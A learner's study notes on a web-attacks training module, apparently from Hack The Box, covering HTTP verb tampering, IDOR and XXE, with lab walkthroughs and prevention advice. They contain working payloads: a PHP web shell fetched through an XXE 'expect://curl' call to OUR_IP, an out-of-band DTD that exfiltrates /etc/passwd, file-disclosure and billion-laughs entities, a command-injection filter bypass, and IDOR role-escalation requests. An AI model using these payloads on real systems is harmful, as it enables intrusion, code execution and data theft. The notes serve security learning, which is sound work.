# Web Attacks
Module covers three types of attacks on web apps:

1. [HTTP Verb Tampering](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/03-Testing_for_HTTP_Verb_Tampering). Exploits web servers that accept many HTTP vers and methods. Sending the unexpected. 
2. [Insecure Direct Object References (IDOR)](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References) essentially the lack of proper access control on the back-end. 
3. [XML External Entity (XXE) Injection](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing) many web apps process XML via a parser. Outdated librated to parse and process XML could diclose local files on the back-end. 


## HTTP Verb Tampering
### Intro to HTTP Verb Tampering
The verbs are what you know as `GET` and `POST`, there are others as well - `HEAD`, `PUT`, `DELETE`. `OPTIONS`, `PATCH`. There are 9 in total. Insecure configs can lead to vulns. 

#### Insecure Configs
Take the following XML to limit request types:
```xml
<Limit GET POST>
    Require valid-user
</Limit>
```
Then an attacker could use something like `HEAD` to bypass auth. 

#### Insecure Coding
Practices cause the other type of vulns when the developer applies specific filters to mitigate particular vulns while not covering all methods. Say a page was found to be vulnerable to SQL injection, and back-end dev mitigated it with:
```php
$pattern = "/^[A-Za-z\s]+$/";

if(preg_match($pattern, $_GET["code"])) {
    $query = "Select * from ports where port_code like '%" . $_REQUEST["code"] . "%'";
    ...SNIP...
}
```
Sanitisation is only getting applied on `GET`. But then the `$_REQUEST["code"]` is looking like there is some `POST` stuff. Very inconsistent. Insecure coding is much more comman then configs. 

### Bypassing basic euthentication 
We just need to alternate HTTP method. There are automated tools to scan pages, they usually miss vulns caused by insecure coding. 

#### Identify
The example box has some file manager to add and reset, to do the reset we need some username and password (and I guess we should not brute force this). The web request is going to `/admin/reset.php` so lets try a GET on `/admin/` and see if the whole directory is restricted to it instead of just the one page. It is also restricted.

#### Exploit
Change web request whilst intercept is on, tried POST and got 401 still. I sent it to repeater and just manually tried others of HEAD and OPTIONS, with the latter giving us a 200. 

So the options working did not mean we got success, instead when I did HEAD it gave a 401 but deleted the files! Using OPTIONS on the base domain will give us what Verbs the server is allowing (and means what ones we should know work and don't work)

### Bypassing Security Filters
Insecure coding to make their own security filters. In PGP it is `$_POST['paramter']`. 

#### Identify
Using the same file manager app. If we try to create a file called `test;` there is a response of "Malicious request denied!" which is to show that the server is performing some lofic on the back-end to identify injection. Repeat that `test;` but tampering the verbs

When we do `change request method` whilst intercepting, burp auto changes the params in get to form data in POST. This was successful. Easy to complete by doing `file; cp /flag.txt ./` and then viewing.

### Verb Tampering Prevention
Take the following config for an apache server for the `.htaccess` file:
```xml
<Directory "/var/www/html/admin">
    AuthType Basic
    AuthName "Admin Panel"
    AuthUserFile /etc/apache2/.htpasswd
    <Limit GET>
        Require valid-user
    </Limit>
</Directory>
```
Config is srtting authorization for the admin web dir. But, this will only get applies to GET requests, leaving accessible via POST. Here is same for `ASP.NET`:
```xml
<system.web>
    <authorization>
        <allow verbs="GET" roles="admin">
            <deny verbs="GET" users="*">
        </deny>
        </allow>
    </authorization>
</system.web>
```

So, not good to limit to one verb. We should restrict authorization to a specific verb and always allow/deny all HTTP verbs and methods. `LimitExcept` in apache, `http-method-omission` in tomcat and `add/remove` in ASP.NET.

#### Insecure Coding
`$_REQUEST['filename']` works for both GET and POST. but `$_POST['filename']` covers that specific one. So, **we must be consistent with our use of HTTP methods**. It is advised to **expand the scope of testing in security filters** by testing all request params. Can be done via following:
- PHP: `$_REQUEST['param']`
- Java: `request.getParamater('param')`


## Insecure Direct Object References (IDOR)

### Intro to IDORs
Most common vulnerabilities. Occur when a web app exposes a direct reference to an onkect, like a file or db resource, when the user can control to obatain access. Take the example where the user requests access to a file uploaded, URL might be like `download.php?file_id=123` so why not try 124, 125 etc. 

#### What makes an IDOR vuln
Exposing a direct ref to an internal object is not a vuln. This makes it possible to exploit another vuln: a **weak access control system**. There are many eays of implementing solid access control, like [RBAC](https://en.wikipedia.org/wiki/Role-based_access_control). Many devs ignore the creation of the access control system, leaving nearly all users with arbitrary access to all other user's data etc. Only thing stopping it is the front-end. Been seen in large web apps like [Fb](https://infosecwriteups.com/disclose-private-attachments-in-facebook-messenger-infrastructure-15-000-ae13602aa486), [Insta](https://infosecwriteups.com/add-description-to-instagram-posts-on-behalf-of-other-users-6500-7d55b4a24c5a), [twitter](https://medium.com/@kedrisec/publish-tweets-by-any-other-user-6c9d892708e3).

#### Impact
Basic example is accessing provate files and things not accessible to us. Depending on the natire of the exposed direct reference, the vuln may even allow the modification or deletion of other users' data, which can lead to a coplete account takeover. IDORs may also escale our privilages if function calls are exposed. 

## Identifying IDORs
### URL Params & APIs
First step is identifiying IDORs in order to spot vulns. Whenever we see something accessing a file or other resource e.g. `?uid=1` we can see an object reference. May also be seen in HTTP headers like cookies. Basic case we can fuzz.

### AJAX Calls
Some web apps front end code might insecurely place all function calls on the client side. Basic example of AJAX Call:
```js
function changeUserPassword() {
    $.ajax({
        url:"change_password.php",
        type: "post",
        dataType: "json",
        data: {uid: user.uid, password: user.password, is_admin: is_admin},
        success:function(result){
            //
        }
    });
}
```
Function may never be called when we use app as a non-admin. But if we find this in the client side, we may test it in diff ways to see whether we can call it to perform changes, which would indicate IDOR vuln. You can do the same to the back-end if you have access (e.g. open-source web apps)

### Hashing / Encoding
Web apps might not use sequential numbers as object references but may encode the reference or hash it instead. If we find params using one of thw two, you may still be able to exploit. Say it was common base64, your eye has been trained for it now. Decode and try another fuzz, just another step. A hash is a little harder, but there might be references of the hashing algo in the source code. HTB has an example in js:

```js
$.ajax({
    url:"download.php",
    type: "post",
    dataType: "json",
    data: {filename: CryptoJS.MD5('file_1.pdf').toString()},
    success:function(result){
        //
    }
});
```

### Compare User Roles
More advanced IDOR attacks, may need to register multiple users and compare the HTTP requests and object references. Say if we had access to two users, one of which can view their salary via API:
```json
{
  "attributes" : 
    {
      "type" : "salary",
      "url" : "/services/data/salaries/users/1"
    },
  "Id" : "1",
  "Name" : "User1"

}
```
Second user may not have these privilages to replicate the call. Even if we could not calculate the API params for other users, we could still have identified a vulnerability in the back-end access control and may start looking for other object references to exploit. 

### Mass IDOR Enumeration
#### Insecure Params
Start with a basic example, the box in this ex is an employee manager web app. You can see files are in the params of `/documents/Report_1_10_2021.pdf` and `/documents/Invoice_1_09_2021.pdf`. The request to get the document did a POST to documents.php with `uid=1`. doing a POST with `uid=2` gives HTML content with other reports and invoices. We can manually enumerate with 3,4 etc. Use Burp Intruder, ZAP Fuzzer, wfuzz, bash or python etc. Say we want to get the files using a bash script:

```bash
curl -s "http://SERVER_IP:PORT/documents.php?uid=1" | grep "<li class='pure-tree_link'>"
```
Will get the results. Use POST instead of GET. The bash script shows that there is some client side code to do some rendering, so lets use the Burp Intruder here and walk through. This was easy thanks to the content length being different, and a second GET can be done to grab the flag. I know how I could easily do this in Python but bash seems a little harder. 



### Bypassing Encoded References
Follows the same excercise, but this time it triggers a download. There is client side code running:
```js
function downloadContract(uid) {
  window.location = `/download.php?contract=${encodeURIComponent(btoa(uid))}`;
}
```
Apparently btoa is base64 encoded and deprecated? The contract URL has `/download.php?contract=MQ==` which I URL decoded. There was function disclosure which was the stuff above. A simple renumeration managed to show the response with the flag, no need to download all the files. 

### IDOR in insecure APIs
Can see it is performing PUT into the `/profile/api.php/profile/1`. There is JSON content being submitted:
```json
{"uid":1,"uuid":"40f5888b67c748df7efba008e7c2f9d2","role":"employee","full_name":"Big User","email":"a_lindon@employees.htb","about":"A Release is like a boat. 80% of the holes plugged is not good enough."}
```
The role=employee is interesting here, we also see it set in the headers of the session too. Few things we could try:
1. Change our uid to another user's uid, such that we can take over their accounts
	-> gives `uid mismatch` in response
2. Change another user's details, which may allow us to perform several web attacks
	-> changing the PUT request to match the uid of 2, so `/profile/api.php/profile/2` we get the same `uid mismatch`
3. Create new users with arbitrary details, or delete existing users
	-> Trying above with `POST` and a high uid of `500`, we get an OK. 
4. Change our role to a more privileged role (e.g. admin) to be able to perform more actions
	-> Changing the role param gives `Invalid Role`, but combining with large uid of 500 is giving reponses.

Challenge just asks to get uid 5, which was easy. 

### Chaining IDOR vulns
Now makes sense to use what was found above ^. It talks about the `role=employee` cookie. Doing a GET also sjows te other uuids which was how we got the flag from last ex. 

Lets do the following:
1. get the users details with a GET
2. Submit it with the PUT

User 2 data:
```json
{"uid":"2","uuid":"4a9bd19b3b8676199592a346051f950c","role":"employee","full_name":"Iona Franklyn","email":"i_franklyn@employees.htb","about":"It takes 20 years to build a reputation and few minutes of cyber-incident to ruin it."}
```
Now edited:
```json
{"uid":"2","uuid":"4a9bd19b3b8676199592a346051f950c","role":"employee","full_name":"Ruh Roh","email":"i_franklyn@pwned.htb","about":"Slammed"}
```

That seemed to work, as the response came back with 1. Another GET on user 2 shows the new data. We could even put a XSS payload in the "about" field or something. Doing an enumeration with the `role=admin` cookie set gives us the profile 10 with data:
```json
{"uid":"10","uuid":"bfd92386a1b48076792e68b596846499","role":"staff_admin","full_name":"admin","email":"admin@employees.htb","about":"Never gonna give you up, Never gonna let you down"}
```
So the admin role name is `staff_admin`. Editing role 1:

Original data:
```json
{"uid":"1","uuid":"40f5888b67c748df7efba008e7c2f9d2","role":"employee","full_name":"Big User","email":"a_lindon@employees.htb","about":"A Release is like a boat. 80% of the holes plugged is not good enough."}
```
Modified:
```json
{"uid":"1","uuid":"40f5888b67c748df7efba008e7c2f9d2","role":"staff_admin","full_name":"Big User","email":"a_lindon@employees.htb","about":"A Release is like a boat. 80% of the holes plugged is not good enough."}
```
Works as planned. Setting the cookie in intercept means you can then browse in chromium nicely too.

### IDOR Prevention
We first have to build an object-level access crontrol syste, and then use secure references for our object when storing and calling them. 

#### Object-Level Access Control
Access control is a vast topic, so this is for IDOR, you must map the RBAC to all objects and resources. Each user then assigned a role that is then checked at every stage of CRUD. Many ways to implement an RBAC, here is an example:

```js
match /api/profile/{userId} {
    allow read, write: if user.isAuth == true
    && (user.uid == userId || user.roles == 'admin');
}
```
This is to give an idea, as we were able to modify our cookie role. In a proper system, the user creds (i.e. they are of role employee or admin) are kept on the server and then just checked. 

#### Object Referencing
Direct object referencing makes it possible to enumerate and exploit these access control vulns. Can still use direct reference, but you need a solid access control system. Don't do object references in clear text, simple or predictable patterns. UUID V4 generates a strongly ransomized id for any element. here is some php to run a query for that uuid object:
```php
$uid = intval($_REQUEST['uid']);
$query = "SELECT url FROM documents where uid=" . $uid;
$result = mysqli_query($conn, $query);
$row = mysqli_fetch_array($result));
echo "<a href='" . $row['url'] . "' target='_blank'></a>";
```
No hashing on the front end, do it when object is created and store it in the backend. The techniques from this part of the module can still be used when we have UUIDs, like repeating one user's request with another's session. 

 
## XML External Entity (XXE) Injection

### Intro
These vulns occur when XML data taken from user controlled input not proprly sanitised. XML similar to HTML and SGML. Formed of element trees, each element is denoted by a `tag`. Tags are things like `<date>`, entities are XML variables, usually wrapped with & or ; chars. 

#### DTD
dtd = Document type definition, pre-defined structs e.g:
```xml
<!DOCTYPE email [
  <!ELEMENT email (date, time, sender, recipients, body)>
  <!ELEMENT recipients (to, cc?)>
  <!ELEMENT cc (to*)>
  <!ELEMENT date (#PCDATA)>
  <!ELEMENT time (#PCDATA)>
  <!ELEMENT sender (#PCDATA)>
  <!ELEMENT to  (#PCDATA)>
  <!ELEMENT body (#PCDATA)>
]>
```

Shows how elements can have child elements, like the email. Whereas others could have raw data (PCDATA). That stuff up top can be placed right after the XML declaration. Or, stored in seperate external file `email.dtd`. And referenced using `SYSTEM`:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "email.dtd">
```

You can also replace the local file path with a URL.

#### Entities
Define custom entities (vars) in DTDs, to reduce repetition. Done with `ENTITY` keyword:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```

Can then be referenced `&company;`. You can repeat the `SYSTEM` thing here too. You can use the `PUBLIC` keyword instead for loading external resources.


### Local file disclosure
Suppose we can define new entities and have them displayed via some web app. In that case, we should also be able to define external entites and ref a local file, particularly the juicy ones. 

#### Identify
Excercise has a contact form. Opened burp on pwnbox (using an internal IP here). Doing a test submission shows a POST to `/submitDetails.php` with the `Content-Type` as `text/plain`. Then the document tree underneath. Web page says "we will contact you soon" but the web response mentions the email. This is the identification: **we see XML being sent, and make note of what is being refered to**. 

Let's define an entity and then refer it in the POST request. Entity:
```xml
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```

Then we use `&company;` under the `<email>` tag for the request. It shows the text. Therefore, we may be able to inject code. A non-vulnerable web app would show "&company;". 

> Some may default to JSON, but could still accept other formats. You can try changing the `Content-Type` and convert the JSON to XML with some [online tool](https://www.convertjson.com/json-to-xml.htm).


#### Reading sensitive files
Lets replace the company definition from "Inlane Freight" to SYSTEM "file:///etc/passwd" and repeat. It gave a blank response. I had a hyphen at the end. Be specific. 

#### Reading source code
If we can read source code of the web app, then we can then whitebox pen test. Trying to read `file:///index.php` does not work. Apparently because it is not in a proper XML format, so it fails. The way around is to use the PHP wrapper filters to base64 encode. This now becomes:
```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```
The burp inspector can then decode on the fly. **Trick only works for PHP web apps**. 

#### RCE w/ XXE
Easiest method would to look for ssh keys, utilise a "hash stealing trick" in windows based apps, or by making a call to our server. If those do not work, may still be able to execute commands on PHP-based web apps through the filter of `expect://`. Requires the module to be installed and enabled. Most efficient way is by writing a web shell from our server and writing it to the web app. To start our server lets:

```bash
$ echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
$ sudo python3 -m http.server 80
```
And then change the XML to run a `curl` and get our shell:
```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
```
All spaces replaced with `$IFS` to avoid breaking XML syntax. Other chars like |>{ may also break the code, so try to avoid. 

#### Other XXE Attacks
SSRF exploitation, used to enumerate locally open ports and access their pages though the XXE vuln. See Server-side attacks. DOS can also be done with a payload of:

```xml
<!DOCTYPE email [
  <!ENTITY a0 "DOS" >
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">        
  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">        
]>
```
And then reference `&a0;`. No longer works with modern web servers, as they protect against entity self-reference. 

### Advanced file disclosure
#### CDATA
PHP filters before allowed us to view some files, but what about others? We can use another method to exfil data (inc. binary). The method is wrapping with `CDATA` e.g. `<![CDATA[ FILE_CONTENT ]>`. One way to get this in something we can manipulate:

```xml
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```

We then reference `&joined;`. Sadly will not work since XML prevents joining internal and external entites. To bypass, we utilize XML parameter entities. What's unique about parameter entities is that if we reference them from an external source, then all of them would be considered as external and can be joined:
```xml
<!ENTITY joined "%begin;%file;%end;">
```

and put this on our exploit server:
```bash
$ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
$ python3 -m http.server 8000
```

And define the parameter entities with the `%`:
```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
...
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
```

Annoyingly I could not get this working on the pwnbox. Unable to tell why....

#### Error based
If web app displays runtime errors, it does not have proper execption handling for the XML. We can use this to reat the output of the XXE exploit. If web app neither writes XML output nor displays any errors, then its a completley blind situation. 

Detected by putting `&nonExistingEntity;` and reading a runtime exception in the response. New dtd file to host:
```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```
Works by defining the file parameter entity and then joins with an entity that does not exist. We are expecting the file to be a part of the error. Other variables like a bad URI or bad characters in the referencd file. 

Then the request to obtain the file is now:
```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

This method not as reliable, as it may have length limitations, and certain special chars may still break it. 

Getting the flag worked on the error based approach. The CDATA approach apparently only worked for `index.php`! **That will be why.** Weird how it does not let you actually follow along though. Trying the CDATA method at the new URL did not fully work either.

### Blind data exfiltration
Previous section is an exmaple of a blind xxe vuln, where we did not recieve any output containing any of our XML input. As the web server was displaying errors, we could use it to read files. But now we are going to be in a completley blind situation.

Using a method of `Out-of-band (OOB) Data Exfiltration`, which is similar to SQL injections, blind command injections, blind XSS and blind XXE. Similar to hosting the DTD file, but instead we will be getting the web app to send a web request to our server with the content of the file we want to read. To do so, we make param entites:

1. Base encoded file we want
2. The web request to our server

payload:
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```
Makes a self-loop, and then either a python server can sput the data, or a PHP server can run and do the decoding for us. E.g. make an `index.php`:
```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```
and start the server with `php -S 0.0.0.0:8000`


#### Automated OOB efil.
Such a tool is [XXEinjector](https://github.com/enjoiz/XXEinjector). Copy the POST from burp into a file and place the `XXEINJECT` under where the XML data starts. I.E. `<?xml version="1.0" encoding="utf-8"?> XXEINJECT`. Runs via `ruby XXEinjector.rb --host=127.0.0.1 --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter`

Does not print the exfil data, it is in the logs: `cat Logs/<HOST>/etc/passwd.log`


### XXE Prevention
Easier than others, caused mainly by outdated XML libraries

#### Avoiding outdated components
The PHP `libxml_disable_entity_loader` function is deprecated since it allows a dev to enable external entities in an unsafe manner, leading to the ones exploited in this module. The warning is just "Warning
This function has been DEPRECATED as of PHP 8.0.0. Relying on this function is highly discouraged." which is interesting. Maybe the dev got this from some CVE website and built a box like that. 

Fancy IDEs also highlight that functions are deprecated. OWASP also has an [XXE prevention cheat sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#php). 

You will also need to update any components that parse XML input, such as API libraries like SOAP. Same goes for SVG image processors or PDF document processors. Same again with `node` modules. 


#### Safe XML Configs
Certain XML configs for web apps help reduce the possibility, these include:
- Disable referencing custom Document Type Definitions (DTDs)
- Disable referencing External XML Entities
- Disable Parameter Entity processing
- Disable support for XInclude
- Prevent Entity Reference Loops

Also have proper exception handling to stop error based attacks. Many recommend other formats such as `JSON` or `YAML`. Also includes avoiding API standards that reply on XML (like SOAP) and JSON-based APIs instead (e.g. REST)


## Skills Assessment
Functionality of web app has a user and login
And has a settings.php file to change password. Seems like a chaining can be done. 

- There is a `uid` Cookie when changing passwords
- There is `/api.php/user/74`

Running an intruder attack on /api.php/user/<> for 1-30 is giving details. 

Looking into the source code of `/settings.php` we can see GET call to `/api.php/token/<uid>` where the UID is the cookie.

We need someone who is an admin. Lets fuzz and get a result with admin in the name. The wfuzz kinda worked, the regex filtering is case sensitive, whereas a python script could have done this:
```python
import requests

ip = <>
port = <>

for i in range(0,100):
    res = requests.get(f"http://{ip}:{port}/api.php/user/{i}")
    if "admin" in res.text.lower():
        print(f"uid {i} gave potential data: {res.text}")
```

Anyways, UID 52 gives us a username of "a.corrales"

Getting the token via a repeater and then making a POST to `reset/php` with the admin's token is giving "Access denied" but when making a PUT we get "Missing parameters"

-> Need to either get access to user UID 52, or give myself permissions like the user of 52, company "Administrator"

Managed to change the password for the admin via doing a GET on reset.php using the token instead of POST.

Now to login with the admin, works, we see a new page of `event.php` which POSTs to `addEvent.php` with some XML data:
```xml
<root>
    <name>
        Name
    </name>
    <details>
        details
    </details>
    <date>
        2023-09-05
    </date>
</root>
```

And the response is `Event 'Name' has been created`. Lets try some XXE stuff on there. Start simple. Doing the first "inlane freight" worked, along with SYSTEM "file:///etc/passwd". doing file:///flag.php did not work but when converting it to base64 it then worked!